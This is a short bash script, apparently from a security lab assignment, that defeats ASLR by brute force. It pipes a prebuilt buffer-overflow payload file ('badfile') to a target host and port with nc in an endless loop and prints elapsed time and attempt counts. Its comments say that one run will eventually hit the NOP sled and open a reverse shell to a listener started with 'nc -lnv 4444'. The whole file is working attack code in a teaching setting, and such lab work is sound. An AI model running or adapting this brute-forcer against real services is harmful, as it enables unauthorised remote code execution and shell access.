#!/bin/bash

# Task 4 - Defeat ASLR by brute force.
# Fire the SAME badfile from Task 2 (fixed return address) at the ASLR-enabled
# Level 3 service over and over. The stack base is randomised on every run
# (19 bits of entropy on 32-bit), so within minutes one run lines the return
# address up with the NOP sled and your reverse shell connects back to
# `nc -lnv 4444`.

TARGET_HOST=10.1.26.9
TARGET_PORT=9092

SECONDS=0
value=0

while true; do
  value=$(( $value + 1 ))
  duration=$SECONDS
  min=$(($duration / 60))
  sec=$(($duration % 60))
  echo "$min minutes and $sec seconds elapsed."
  echo "The program has been running $value times so far."
  cat badfile | nc $TARGET_HOST $TARGET_PORT
done
